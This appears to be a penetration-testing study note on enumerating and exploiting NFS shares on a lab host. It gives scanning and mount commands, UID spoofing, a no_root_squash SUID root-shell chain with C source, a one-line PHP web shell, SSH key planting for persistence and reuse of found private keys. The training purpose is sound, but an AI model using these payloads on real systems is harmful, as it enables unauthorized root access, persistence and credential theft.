---
tags: [module/footprinting, nfs, network-file-system, linux-sharing, level/advanced, practical]
---

# NFS Enumeration - Practical Application

## Complete NFS Enumeration Workflow

Phase 1: Service Discovery (RPC Enumeration)
Phase 2: Share Enumeration
Phase 3: Mount and File Analysis
Phase 4: UID/GID Mapping
Phase 5: Privilege Escalation via no_root_squash
Phase 6: File Upload/Download Exploitation
Phase 7: Version-Specific Attacks

---

## Phase 1: Service Discovery

### Key Ports
- 111/tcp - rpcbind (RPC port mapper)
- 2049/tcp - NFS
- Dynamic ports for mountd, nlockmgr, etc. (learned via rpcinfo)

### Nmap Scan

sudo nmap -p111,2049 -sV -sC 10.129.14.128

### Full RPC Enumeration

sudo nmap -sV -p111 --script rpcinfo 10.129.14.128

### NFS-Specific NSE Scripts

sudo nmap --script nfs* -p111,2049 10.129.14.128 -sV

Scripts include:
- nfs-ls.nse - List NFS exports
- nfs-showmount.nse - Show available mounts
- nfs-statfs.nse - Filesystem statistics

### Example Nmap Output

nmap --script nfs* -p111,2049 10.129.14.128

| nfs-ls: Volume /mnt/nfs
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID    GID    SIZE  TIME                 FILENAME
| rwxrwxrwx   65534  65534  4096  2021-09-19T15:28:17  .
| rw-r--r--   0      0      1872  2021-09-19T15:27:42  id_rsa
| rw-r--r--   0      0      348   2021-09-19T15:28:17  id_rsa.pub
| rw-r--r--   0      0      0     2021-09-19T15:22:30  nfs.share

| nfs-showmount: 
|_  /mnt/nfs 10.129.14.0/24

---

## Phase 2: Share Enumeration

### showmount

showmount -e 10.129.14.128
showmount -a 10.129.14.128   # Show all mounts
showmount -d 10.129.14.128   # Show only directories

### rpcinfo

rpcinfo -p 10.129.14.128

This shows all RPC services:

program version proto  port  service
100000  2,3,4  tcp   111   rpcbind
100003  3,4    tcp  2049   nfs
100005  1,2,3  tcp  random mountd
100021  1,3,4  tcp  random nlockmgr

---

## Phase 3: Mount and File Analysis

### Create Mount Point

mkdir target-nfs

### Mount the Share

sudo mount -t nfs 10.129.14.128:/mnt/nfs target-nfs/ -o nolock

### Alternative: Mount with Specific NFS Version

sudo mount -t nfs -o vers=3,nolock 10.129.14.128:/mnt/nfs target-nfs/
sudo mount -t nfs -o vers=4,nolock 10.129.14.128:/mnt/nfs target-nfs/

### Check Mounted Filesystem

df -h | grep nfs
mount | grep nfs

### Browse Files

cd target-nfs
ls -la

---

## Phase 4: UID/GID Mapping

### The Core Problem

NFS authenticates based on UID/GID numbers, not usernames. If your local UID 1000 matches a remote file's UID 1000, you can access it regardless of your username.

### Check File Ownership with UIDs

ls -n

Output:
-rw-r--r-- 1 1000 1000 1872 Sep 25 00:55 cry0l1t3.priv
-rw-r--r-- 1    0    0 1872 Sep 19 17:27 id_rsa
-rw-r--r-- 1    0 1000 1221 Sep 19 18:21 backup.sh

### Create Local Users Matching Remote UIDs

For UID 1000:
sudo useradd -u 1000 -M temp1000
sudo -u temp1000 bash

For UID 0 (root):
sudo useradd -u 0 -M temproot  # This may conflict with existing root

### Check Current UID

id
whoami

### Access Files as Matched User

sudo -u temp1000 cat cry0l1t3.priv

---

## Phase 5: Privilege Escalation via no_root_squash

### What is no_root_squash?

Normally, NFS maps root (UID 0) on the client to an anonymous user (nobody) to prevent root access. With no_root_squash, root on client = root on server.

### Check if no_root_squash is Enabled

Look at export options:

cat /etc/exports

If you see `no_root_squash` on a share, it's vulnerable.

### From Client Side

If you can mount a share with no_root_squash:

1. Mount the share as root
2. Create a file as root
3. The file will be owned by root on the server

### SUID Binary Exploitation

Create a SUID binary on the mounted share:

cp /bin/bash ./rootshell
chmod 4755 ./rootshell
chown root:root ./rootshell

Now when any user on the server executes this binary, it runs as root.

### Full no_root_squash Exploit Chain

1. Mount vulnerable share
2. Create a simple C program:

cat > shell.c << 'INNER'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
INNER

3. Compile: gcc -o rootshell shell.c
4. Set SUID: chmod 4755 rootshell
5. Victim executes and gets root

---

## Phase 6: File Upload/Download Exploitation

### Download Sensitive Files

Look for:
- SSH keys (id_rsa)
- Configuration files
- Database dumps
- Backup scripts
- Password files

cp id_rsa ~/.ssh/
chmod 600 id_rsa
ssh -i id_rsa user@target

### Upload Malicious Files

If share is writable:

cp shell.php target-nfs/
cp reverse.elf target-nfs/

If share is web-accessible, upload web shell:
echo '<?php system($_GET["cmd"]); ?>' > shell.php
cp shell.php target-nfs/

Access: http://target/mnt/nfs/shell.php\?cmd\=id

### Upload SSH Key for Persistence

cp ~/.ssh/id_rsa.pub authorized_keys
chmod 600 authorized_keys
cp authorized_keys target-nfs/.ssh/

If you can write to a user's .ssh directory on the NFS share, you can add your key.

---

## Phase 7: Version-Specific Attacks

### NFSv3

- Limited security
- UID/GID authentication only
- Easy to spoof UIDs

### NFSv4

- Kerberos support
- ACLs
- More complex but potentially misconfigured

### Check NFS Version

rpcinfo -p 10.129.14.128 | grep nfs

Look for version numbers.

### NFS Enumeration Complete Script

Save as nfs-enum.sh:

#!/bin/bash
TARGET=$1
MOUNT_DIR="nfs-mount-$$"

echo "[*] Starting NFS enumeration on $TARGET"

echo "[*] Running Nmap scan..."
nmap -p111,2049 --script nfs* -oN nfs-nmap.txt $TARGET

echo "[*] Checking showmount..."
showmount -e $TARGET 2>&1 | tee nfs-shares.txt

echo "[*] RPC info..."
rpcinfo -p $TARGET 2>&1 | tee nfs-rpc.txt

echo "[*] Attempting to mount all discovered shares..."
while read share; do
    if [[ $share =~ ^/ ]]; then
        echo "Mounting $share"
        mkdir -p "$MOUNT_DIR$share"
        mount -t nfs $TARGET:$share "$MOUNT_DIR$share" -o nolock 2>/dev/null
        if [ $? -eq 0 ]; then
            echo "[+] Successfully mounted $share to $MOUNT_DIR$share"
            ls -ln "$MOUNT_DIR$share" > "nfs-files-$(basename $share).txt"
            umount "$MOUNT_DIR$share"
        else
            echo "[-] Failed to mount $share"
        fi
    fi
done < nfs-shares.txt

rmdir -p $MOUNT_DIR 2>/dev/null
echo "[*] NFS enumeration complete"

---

## Privilege Escalation Checklist

| Condition | What to Check |
|-----------|---------------|
| no_root_squash | Upload SUID binary for root |
| Writable share | Upload web shell, backdoor |
| SSH keys found | Try to login |
| Private keys | chmod 600, use for SSH |
| Configuration files | Extract passwords, endpoints |
| Backups | May contain credentials |
| .bash_history | Command history |

---

## Tool Comparison

| Tool | Purpose | Best For |
|------|---------|----------|
| showmount | List exports | Quick share discovery |
| rpcinfo | RPC enumeration | Service version identification |
| mount | Mount shares | Accessing files |
| nmap + scripts | Deep scanning | Comprehensive info gathering |
| ls -n | View actual UIDs | Mapping for user creation |

---

## Key Takeaways

- NFS uses RPC on port 111 and NFS on 2049
- Authentication is UID-based, not username-based
- showmount -e lists available shares
- mount the share to access files
- Use ls -n to see actual UID numbers
- Create local users with matching UIDs
- no_root_squash allows root on client = root on server
- Upload SUID binaries for privilege escalation
- Check for SSH keys in shares
- Writable shares + web access = RCE
- Always unmount when done
- Document all UIDs and file ownership
